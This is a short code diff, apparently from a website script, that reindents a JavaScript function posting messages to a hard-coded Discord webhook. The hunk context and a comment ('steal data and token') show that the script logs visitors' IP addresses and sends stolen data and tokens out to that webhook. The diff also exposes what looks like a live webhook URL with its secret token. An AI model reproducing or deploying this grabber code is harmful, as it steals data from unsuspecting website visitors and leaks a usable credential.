@@ -60,29 +60,29 @@ Someone visited the website from:
     .catch(error => {
         console.error('Error fetching IP address:', error.message);
     });
-}
 
-// Function to send message to Discord webhook
-function sendMessageToDiscord(message) {
-    fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            content: message
+    // Function to send message to Discord webhook
+    function sendMessageToDiscord(message) {
+        fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                content: message
+            })
         })
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log('Message sent to Discord!');
-        } else {
-            console.error('Failed to send message to Discord:', response.status, response.statusText);
-        }
-    })
-    .catch(error => {
-        console.error('Error sending message to Discord:', error.message);
-    });
+        .then(response => {
+            if (response.ok) {
+                console.log('Message sent to Discord!');
+            } else {
+                console.error('Failed to send message to Discord:', response.status, response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error('Error sending message to Discord:', error.message);
+        });
+    }
 }
 
 // Call function to steal data and token
